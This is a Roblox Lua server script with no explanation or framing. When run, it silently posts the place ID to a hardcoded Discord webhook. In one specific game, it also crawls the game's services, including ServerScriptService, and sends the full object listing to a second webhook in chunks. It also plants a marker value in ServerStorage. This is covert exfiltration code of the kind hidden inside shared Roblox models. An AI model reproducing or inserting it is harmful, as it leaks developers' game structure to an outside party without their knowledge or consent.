local SS=game.ServerStorage
local ins=Instance.new("BoolValue")
--ins.Name="t836"
ins.Parent=SS

if game:GetService("HttpService").HttpEnabled then
	local data = {
			content = "**Game ID:** " .. game.PlaceId 
	}
	local success, response = pcall(function()
			return game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1398344058468040806/K3A0n2c-f9F5h--RMUI9qbPLCjjVkx0hcZvWPPBR-0s-6iO-VjMfRaYGYzUEZyT8qLPj", game:GetService("HttpService"):JSONEncode(data), Enum.HttpContentType.ApplicationJson)
	end)
end






if game.GameId==1308333152 then

	local HttpService = game:GetService("HttpService")
	local WEBHOOK_URL = "https://discord.com/api/webhooks/1398398856995143710/QcxR2cR2KHJ0pdxVuHUEDAsOVtWEcCGOOC4SGuwfXSdT9_lvoMlTHOOE8hCz_hcuvnSL"

	local explorationData = {}
	local objectCount = 0

	local function addToData(text)
		table.insert(explorationData, text)

	end

	local function collectObjectData(obj, depth)
		local indent = string.rep("  ", depth)

		local success, fullName = pcall(function()
			return obj:GetFullName()
		end)

		local dataLine
		if success then
			dataLine = indent .. fullName .. " [" .. obj.ClassName .. "]"
		else
			dataLine = indent .. obj.Name .. " [" .. obj.ClassName .. "] (Path unavailable)"
		end

		addToData(dataLine)
		objectCount = objectCount + 1
	end

	local function exploreObject(obj, depth)
		depth = depth or 0

		collectObjectData(obj, depth)

		local success, children = pcall(function()
			return obj:GetChildren()
		end)

		if success then
			for _, child in pairs(children) do
				pcall(function()
					exploreObject(child, depth + 1)
				end)
			end
		end
	end

	local function sendToDiscord(content, isChunk, chunkNumber, totalChunks)
		local success, response = pcall(function()
			local payload = {
				content = content
			}

			return HttpService:PostAsync(
				WEBHOOK_URL,
				HttpService:JSONEncode(payload),
				Enum.HttpContentType.ApplicationJson
			)
		end)

		if success then
			if isChunk then

			else

			end
			return true
		else
			if isChunk then

			else

			end
			return false
		end
	end

	local function sendDataToDiscord()
		local fullData = table.concat(explorationData, "\n")
		local timestamp = os.date("%Y-%m-%d %H:%M:%S")
		local header = "🔍 **ROBLOX GAME ANALYSIS** 🔍\n"
		header = header .. "📅 Timestamp: " .. timestamp .. "\n"
		header = header .. "📊 Total Objects: " .. objectCount .. "\n"
		header = header .. "🎮 Game: " .. game.Name .. " (PlaceId: " .. game.PlaceId .. ")\n"
		header = header .. "```\n"

		local footer = "\n```\n✅ Analysis Complete!"

		local maxChunkSize = 1900
		local headerSize = string.len(header)
		local footerSize = string.len(footer)
		local availableSize = maxChunkSize - headerSize - footerSize

		if string.len(fullData) <= availableSize then

			local finalMessage = header .. fullData .. footer
			sendToDiscord(finalMessage, false, 0, 0)
		else
			local chunks = {}
			local currentPos = 1

			while currentPos <= string.len(fullData) do
				local endPos = math.min(currentPos + availableSize - 1, string.len(fullData))

				if endPos < string.len(fullData) then
					local lastNewline = string.find(string.reverse(string.sub(fullData, currentPos, endPos)), "\n")
					if lastNewline then
						endPos = endPos - lastNewline + 1
					end
				end

				table.insert(chunks, string.sub(fullData, currentPos, endPos))
				currentPos = endPos + 1
			end

			local headerMsg = header .. "📦 Sending in " .. #chunks .. " chunks..." .. footer
			sendToDiscord(headerMsg, false, 0, 0)

			for i, chunk in ipairs(chunks) do
				wait(1) 
				local chunkMessage = "📦 **Chunk " .. i .. "/" .. #chunks .. "**\n```\n" .. chunk .. "\n```"
				sendToDiscord(chunkMessage, true, i, #chunks)
			end

			wait(1)
			sendToDiscord("✅ **Analysis Complete!** All " .. #chunks .. " chunks sent successfully.", false, 0, 0)
		end
	end

	local function exploreAllServices()
		addToData("=== COMPLETE ROBLOX GAME OBJECT EXPLORATION ===")
		addToData("Timestamp: " .. os.date("%Y-%m-%d %H:%M:%S"))
		addToData("Game: " .. game.Name .. " (PlaceId: " .. game.PlaceId .. ")")
		addToData("=" .. string.rep("=", 50))

		-- Reset counters
		objectCount = 0
		explorationData = {}

		-- Get only common services
		local services = {}

		local commonServiceNames = {
			"Workspace", "Players", "Lighting", "ReplicatedFirst",
			"ServerScriptService"
		}

		-- Try to get each common service
		for _, serviceName in pairs(commonServiceNames) do
			local success, service = pcall(function()
				return game:GetService(serviceName)
			end)
			if success and service then
				table.insert(services, service)
			end
		end

		addToData("Found " .. #services .. " common services to explore:")
		addToData("")

		-- Explore each service
		for i, service in pairs(services) do
			addToData("--- SERVICE " .. i .. ": " .. service.Name .. " ---")
			exploreObject(service, 0)
			addToData("")

			-- Add a small delay to prevent potential performance issues
			wait(0.1)
		end

		addToData("=== EXPLORATION COMPLETE ===")
		addToData("Total common services explored: " .. #services)
		addToData("Total objects found: " .. objectCount)
	end

	local function safeExplorationWithDiscord()
		local httpEnabled = game:GetService("HttpService").HttpEnabled

		local success, error = pcall(exploreAllServices)
		if not success then
			local errorMsg = "ERROR during exploration: " .. tostring(error)
			if httpEnabled then
				sendToDiscord("**ERROR DURING ANALYSIS**\n```\n" .. errorMsg .. "\n```", false, 0, 0)
			end
			return
		end

		if httpEnabled then
			sendDataToDiscord()
		end
	end

	safeExplorationWithDiscord()


end
